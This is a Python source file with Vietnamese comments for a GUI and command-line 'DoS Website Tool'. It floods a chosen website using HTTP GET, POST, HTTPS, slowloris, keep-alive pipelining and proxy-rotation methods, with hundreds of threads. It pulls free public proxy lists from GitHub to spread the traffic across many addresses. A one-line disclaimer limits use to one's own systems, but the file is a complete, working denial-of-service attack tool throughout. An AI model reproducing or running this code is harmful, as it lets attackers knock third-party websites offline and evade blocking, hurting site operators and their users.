"""
DoS Website Tool - Single Target Stress Test + Proxy Rotation
Yêu cầu: pip install requests
Chạy: python dos_website.py
Chỉ dùng để kiểm thử hệ thống của chính bạn hoặc có sự cho phép bằng văn bản.
"""

import socket
import ssl
import threading
import random
import time
import os
import queue
import struct
import select
import requests
import tkinter as tk
from tkinter import scrolledtext, Entry, Button, Label, StringVar, IntVar, OptionMenu
from datetime import datetime
from itertools import cycle

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

PROXY_FILE = "proxies.txt"

# ====== PROXY LOADER ======
def load_proxies(filepath=PROXY_FILE):
    """Đọc proxy từ file, mỗi dòng 1 proxy"""
    if not os.path.exists(filepath):
        return []
    with open(filepath, "r", encoding="utf-8") as f:
        lines = [l.strip() for l in f if l.strip() and not l.startswith("#")]
    proxies = []
    for line in lines:
        if "://" not in line:
            line = "http://" + line
        proxies.append(line)
    return proxies

def download_free_proxies(filepath=PROXY_FILE):
    """Tải proxy free từ GitHub"""
    urls = [
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    ]
    proxies = []
    for url in urls:
        try:
            r = requests.get(url, timeout=10)
            if r.status_code == 200:
                proxies.extend([l.strip() for l in r.text.splitlines() if l.strip()])
        except Exception:
            pass
    # Loại trùng
    proxies = list(set(proxies))
    with open(filepath, "w", encoding="utf-8") as f:
        f.write("\n".join(proxies))
    return proxies

# ====== ENGINE ======
class DoSEngine:
    def __init__(self, target, port, threads, duration, method, log_cb, progress_cb, proxies=None):
        self.target = target
        self.port = int(port)
        self.threads = int(threads)
        self.duration = int(duration)
        self.method = method
        self.log = log_cb
        self.progress = progress_cb

        self.stop_flag = False
        self.requests_sent = 0
        self.bytes_sent = 0
        self.errors = 0
        self.lock = threading.Lock()
        self.start_time = 0

        self.proxies = proxies or []
        self.proxy_pool = cycle(self.proxies) if self.proxies else None
        self.proxy_lock = threading.Lock()

        try:
            self.target_ip = socket.gethostbyname(target)
        except socket.gaierror:
            self.target_ip = target

    def _get_proxy(self):
        """Lấy proxy tiếp theo (round-robin)"""
        if not self.proxy_pool:
            return None
        with self.proxy_lock:
            return next(self.proxy_pool)

    def _create_sock(self, timeout=4):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65536)
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
        except Exception:
            pass
        return s

    def _inc(self, req=1, bytes_=0, err=False):
        with self.lock:
            self.requests_sent += req
            self.bytes_sent += bytes_
            if err:
                self.errors += 1

    # ---------- HTTP GET ----------
    def http_get(self):
        while not self.stop_flag:
            try:
                s = self._create_sock(3)
                s.connect((self.target_ip, self.port))
                path = "/" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=6))
                req = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {self.target}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                ).encode()
                s.send(req)
                try:
                    s.recv(2048)
                except Exception:
                    pass
                s.close()
                self._inc(1, len(req))
            except Exception:
                self._inc(err=True)

    # ---------- HTTP POST ----------
    def http_post(self):
        while not self.stop_flag:
            try:
                s = self._create_sock(3)
                s.connect((self.target_ip, self.port))
                body = os.urandom(random.randint(256, 2048))
                req = (
                    f"POST / HTTP/1.1\r\n"
                    f"Host: {self.target}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                ).encode() + body
                s.send(req)
                s.close()
                self._inc(1, len(req))
            except Exception:
                self._inc(err=True)

    # ---------- HTTPS GET ----------
    def https_get(self):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        while not self.stop_flag:
            try:
                raw = self._create_sock(4)
                raw.connect((self.target_ip, self.port))
                s = ctx.wrap_socket(raw, server_hostname=self.target)
                req = (
                    f"GET /?{random.randint(1,999999)} HTTP/1.1\r\n"
                    f"Host: {self.target}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                ).encode()
                s.send(req)
                s.close()
                self._inc(1, len(req))
            except Exception:
                self._inc(err=True)

    # ---------- SLOWLORIS ----------
    def slowloris(self):
        sock_list = []
        while not self.stop_flag:
            try:
                s = self._create_sock(4)
                s.connect((self.target_ip, self.port))
                s.send(f"GET /?{random.randint(1,9999)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {self.target}\r\n".encode())
                s.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
                sock_list.append(s)
                self._inc(1, 100)
            except Exception:
                self._inc(err=True)

            for s in list(sock_list):
                try:
                    s.send(b"X-a: b\r\n")
                except Exception:
                    sock_list.remove(s)
            time.sleep(8)

    # ---------- KEEP-ALIVE FLOOD ----------
    def keepalive_flood(self):
        payload = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
            f"Connection: keep-alive\r\n\r\n"
        ).encode() * 10
        payload_len = len(payload)

        time.sleep(random.uniform(0.005, 0.05))

        while not self.stop_flag:
            s = None
            try:
                s = self._create_sock(3)
                s.connect((self.target_ip, self.port))
                local_req = 0
                local_bytes = 0

                for loop_idx in range(120):
                    if self.stop_flag:
                        break
                    s.sendall(payload)
                    local_req += 10
                    local_bytes += payload_len

                    if loop_idx % 4 == 0:
                        try:
                            r, _, _ = select.select([s], [], [], 0)
                            if r:
                                s.recv(32768)
                        except Exception:
                            pass

                    if local_req >= 100:
                        self._inc(local_req, local_bytes)
                        local_req = 0
                        local_bytes = 0

                if local_req > 0:
                    self._inc(local_req, local_bytes)

            except (ConnectionResetError, BrokenPipeError, socket.timeout):
                pass
            except Exception:
                self._inc(err=True)
            finally:
                if s:
                    try:
                        s.close()
                    except Exception:
                        pass

    # ---------- PROXY ROTATION FLOOD (method mới) ----------
    def proxy_flood(self):
        """Flood qua proxy rotation - mỗi request 1 proxy khác"""
        if not self.proxies:
            self._inc(err=True)
            return

        session = requests.Session()
        while not self.stop_flag:
            proxy_url = self._get_proxy()
            if not proxy_url:
                time.sleep(0.1)
                continue
            proxies = {"http": proxy_url, "https": proxy_url}
            try:
                headers = {"User-Agent": random.choice(USER_AGENTS)}
                url = f"https://{self.target}/?{random.randint(1,999999)}"
                r = session.get(
                    url,
                    proxies=proxies,
                    headers=headers,
                    timeout=5,
                    allow_redirects=False,
                )
                self._inc(1, len(r.content))
            except Exception:
                self._inc(err=True)

    def _worker(self):
        if self.method == "http":
            self.http_get()
        elif self.method == "post":
            self.http_post()
        elif self.method == "https":
            self.https_get()
        elif self.method == "slowloris":
            self.slowloris()
        elif self.method == "keepalive":
            self.keepalive_flood()
        elif self.method == "proxy":
            self.proxy_flood()

    def start(self):
        self.stop_flag = False
        self.start_time = time.time()
        self.log(f"[*] Target: {self.target} ({self.target_ip}):{self.port}")
        self.log(f"[*] Method: {self.method.upper()} | Threads: {self.threads} | Duration: {self.duration}s")
        if self.proxies:
            self.log(f"[*] Proxy pool: {len(self.proxies)} proxy")

        for _ in range(self.threads):
            threading.Thread(target=self._worker, daemon=True).start()

        def monitor():
            while not self.stop_flag:
                elapsed = int(time.time() - self.start_time)
                self.progress(self.requests_sent, self.bytes_sent, self.errors, elapsed)
                if elapsed >= self.duration:
                    self.stop_flag = True
                    break
                time.sleep(0.5)
            self.log(f"[✓] Kết thúc: {self.requests_sent:,} requests | {self.bytes_sent:,} bytes | {self.errors:,} errors")

        threading.Thread(target=monitor, daemon=True).start()

    def stop(self):
        self.stop_flag = True
        self.log("[!] Đã gửi lệnh dừng.")

# ====== GUI ======
class App:
    def __init__(self, root):
        self.root = root
        self.root.title("DoS Website Tool + Proxy")
        self.root.geometry("780x680")
        self.root.resizable(False, False)

        self.engine = None
        self.log_q = queue.Queue()
        self.prog_q = queue.Queue()
        self.proxies = []

        self._build_ui()
        self._pump()

    def _build_ui(self):
        p = {"padx": 8, "pady": 4}

        tk.Label(self.root, text="Target URL / Domain:").pack(anchor="w", **p)
        self.target_var = StringVar(value="example.com")
        tk.Entry(self.root, textvariable=self.target_var, width=95).pack(**p)

        f1 = tk.Frame(self.root); f1.pack(fill="x", **p)

        tk.Label(f1, text="Port:").grid(row=0, column=0, sticky="w")
        self.port_var = IntVar(value=80)
        tk.Entry(f1, textvariable=self.port_var, width=8).grid(row=0, column=1, padx=4)

        tk.Label(f1, text="Threads:").grid(row=0, column=2, sticky="w")
        self.threads_var = IntVar(value=500)
        tk.Entry(f1, textvariable=self.threads_var, width=8).grid(row=0, column=3, padx=4)

        tk.Label(f1, text="Duration (s):").grid(row=0, column=4, sticky="w")
        self.duration_var = IntVar(value=60)
        tk.Entry(f1, textvariable=self.duration_var, width=8).grid(row=0, column=5, padx=4)

        tk.Label(f1, text="Method:").grid(row=0, column=6, sticky="w")
        self.method_var = StringVar(value="http")
        OptionMenu(f1, self.method_var, "http", "post", "https", "slowloris", "keepalive", "proxy").grid(row=0, column=7, padx=4)

        f2 = tk.Frame(self.root); f2.pack(**p)
        tk.Button(f2, text="▶ START", command=self.start, bg="#dc3545", fg="white", width=14).pack(side="left", padx=4)
        tk.Button(f2, text="⏹ STOP", command=self.stop, bg="#6c757d", fg="white", width=14).pack(side="left", padx=4)
        tk.Button(f2, text="🌐 CURL -I", command=self.curl_head, bg="#00bcd4", fg="black", width=14).pack(side="left", padx=4)

        f3 = tk.Frame(self.root); f3.pack(fill="x", **p)
        tk.Button(f3, text="📂 Load Proxy File", command=self.load_proxy_file, bg="#28a745", fg="white", width=18).pack(side="left", padx=4)
        tk.Button(f3, text="⬇ Tải Proxy Free", command=self.download_proxies, bg="#ffc107", fg="black", width=18).pack(side="left", padx=4)
        self.proxy_count_label = tk.Label(f3, text="Proxy: 0", fg="blue", font=("Consolas", 10))
        self.proxy_count_label.pack(side="left", padx=10)

        self.prog_label = tk.Label(self.root, text="Requests: 0 | Bytes: 0 | Errors: 0 | Time: 0s",
                                   font=("Consolas", 10), fg="blue")
        self.prog_label.pack(anchor="w", padx=10, pady=(6, 0))

        tk.Label(self.root, text="Log:").pack(anchor="w", padx=10)
        self.log_box = scrolledtext.ScrolledText(self.root, width=95, height=20,
                                                 state="disabled", font=("Consolas", 9))
        self.log_box.pack(padx=10, pady=(0, 10))

    def _log(self, msg):
        self.log_q.put(msg)

    def _progress(self, req, bytes_, err, elapsed):
        self.prog_q.put((req, bytes_, err, elapsed))

    def _pump(self):
        try:
            while True:
                msg = self.log_q.get_nowait()
                ts = datetime.now().strftime("%H:%M:%S")
                self.log_box.config(state="normal")
                self.log_box.insert(tk.END, f"[{ts}] {msg}\n")
                self.log_box.see(tk.END)
                self.log_box.config(state="disabled")
        except Exception:
            pass

        try:
            while True:
                req, bytes_, err, elapsed = self.prog_q.get_nowait()
                self.prog_label.config(
                    text=f"Requests: {req:,} | Bytes: {bytes_:,} | Errors: {err:,} | Time: {elapsed}s"
                )
        except Exception:
            pass

        self.root.after(200, self._pump)

    def load_proxy_file(self):
        self.proxies = load_proxies(PROXY_FILE)
        self.proxy_count_label.config(text=f"Proxy: {len(self.proxies)}")
        self._log(f"[+] Đã load {len(self.proxies)} proxy từ {PROXY_FILE}")

    def download_proxies(self):
        def _do():
            self._log("[*] Đang tải proxy free từ GitHub...")
            proxies = download_free_proxies(PROXY_FILE)
            self.proxies = proxies
            self.proxy_count_label.config(text=f"Proxy: {len(proxies)}")
            self._log(f"[+] Đã tải {len(proxies)} proxy vào {PROXY_FILE}")
        threading.Thread(target=_do, daemon=True).start()

    def start(self):
        if self.engine and not self.engine.stop_flag:
            self._log("[!] Đang chạy.")
            return

        target = self.target_var.get().strip()
        if not target:
            self._log("[!] Chưa nhập target.")
            return

        target = target.replace("http://", "").replace("https://", "").split("/")[0]

        try:
            port = int(self.port_var.get())
            threads = int(self.threads_var.get())
            duration = int(self.duration_var.get())
        except ValueError:
            self._log("[!] Giá trị không hợp lệ.")
            return

        if threads <= 0 or duration <= 0:
            self._log("[!] Threads và Duration phải > 0.")
            return

        method = self.method_var.get()

        # Nếu dùng proxy mà chưa load, thử load
        if method == "proxy" and not self.proxies:
            self.proxies = load_proxies(PROXY_FILE)
            if not self.proxies:
                self._log("[!] Chưa có proxy. Bấm 'Tải Proxy Free' hoặc 'Load Proxy File'.")
                return
            self.proxy_count_label.config(text=f"Proxy: {len(self.proxies)}")

        self._log(f"[*] Khởi động {method.upper()} flood...")

        self.engine = DoSEngine(
            target=target,
            port=port,
            threads=threads,
            duration=duration,
            method=method,
            log_cb=self._log,
            progress_cb=self._progress,
            proxies=self.proxies,
        )
        threading.Thread(target=self.engine.start, daemon=True).start()

    def stop(self):
        if self.engine:
            self.engine.stop()
        else:
            self._log("[!] Không có tiến trình nào.")

    def curl_head(self):
        target = self.target_var.get().strip()
        if not target:
            self._log("[!] Chưa nhập Target URL / Domain để curl")
            return

        def _do_curl():
            url = target
            if not url.startswith("http://") and not url.startswith("https://"):
                url = f"https://{target}"
            self._log(f"[CURL -I] > curl -s -I {url}")
            try:
                import subprocess
                res = subprocess.run(["curl.exe", "-s", "-I", "--max-time", "10", url],
                                     capture_output=True, text=True, timeout=12)
                out = res.stdout.strip()
                if not out and res.stderr:
                    self._log(f"[ERR] {res.stderr.strip()}")
                elif out:
                    for line in out.splitlines():
                        if line.strip():
                            self._log(f"  {line.strip()}")
                    self._log("[✓] Curl headers hoàn tất.")
                else:
                    self._log(f"[!] Không nhận được phản hồi từ {url}")
            except Exception as e:
                self._log(f"[ERR] Lỗi curl: {e}")

        threading.Thread(target=_do_curl, daemon=True).start()

# ====== MAIN ======
def main():
    import argparse
    import sys

    try:
        if hasattr(sys.stdout, 'reconfigure'):
            sys.stdout.reconfigure(encoding='utf-8')
        if hasattr(sys.stderr, 'reconfigure'):
            sys.stderr.reconfigure(encoding='utf-8')
    except Exception:
        pass

    try:
        import resource
        resource.setrlimit(resource.RLIMIT_NOFILE, (65535, 65535))
    except Exception:
        pass

    parser = argparse.ArgumentParser(description="DoS Website Tool + Proxy - scripts/hihi")
    parser.add_argument("--cli", action="store_true", help="Chạy chế độ dòng lệnh không cần GUI")
    parser.add_argument("--target", type=str, default="", help="Domain hoặc IP mục tiêu")
    parser.add_argument("--port", type=int, default=80, help="Cổng kết nối")
    parser.add_argument("--threads", type=int, default=100, help="Số luồng đồng thời")
    parser.add_argument("--duration", type=int, default=30, help="Thời gian chạy (giây)")
    parser.add_argument("--method", type=str, default="http",
                        choices=["http", "post", "https", "slowloris", "keepalive", "proxy"],
                        help="Phương thức kiểm thử")
    parser.add_argument("--proxy-file", type=str, default=PROXY_FILE, help="File chứa proxy")
    args, _ = parser.parse_known_args()

    if args.cli or args.target:
        target = args.target.replace("http://", "").replace("https://", "").split("/")[0].strip()
        if not target:
            print("[!] Lỗi: Chưa cung cấp target hợp lệ.", flush=True)
            sys.exit(1)

        # Load proxy nếu method là proxy
        proxies = []
        if args.method == "proxy":
            proxies = load_proxies(args.proxy_file)
            if not proxies:
                print(f"[!] Không có proxy trong {args.proxy_file}, tải free...", flush=True)
                proxies = download_free_proxies(args.proxy_file)
                print(f"[+] Đã tải {len(proxies)} proxy", flush=True)

        def cli_log(msg):
            ts = datetime.now().strftime("%H:%M:%S")
            print(f"LOG:[{ts}] {msg}", flush=True)

        def cli_progress(req, bytes_, err, elapsed):
            print(f"PROGRESS:{req}:{bytes_}:{err}:{elapsed}", flush=True)

        print(f"[*] KHỞI TẠO TEST CHỊU TẢI TARGET: {target}:{args.port} | LUỒNG: {args.threads} | PHƯƠNG THỨC: {args.method.upper()}", flush=True)
        engine = DoSEngine(
            target=target,
            port=args.port,
            threads=args.threads,
            duration=args.duration,
            method=args.method,
            log_cb=cli_log,
            progress_cb=cli_progress,
            proxies=proxies,
        )
        engine.start()

        try:
            while not engine.stop_flag:
                time.sleep(0.5)
        except KeyboardInterrupt:
            engine.stop()

        print("[✓] TIẾN TRÌNH TEST HOÀN TẤT.", flush=True)
        sys.exit(0)

    root = tk.Tk()
    App(root)
    root.mainloop()

if __name__ == "__main__":
    main()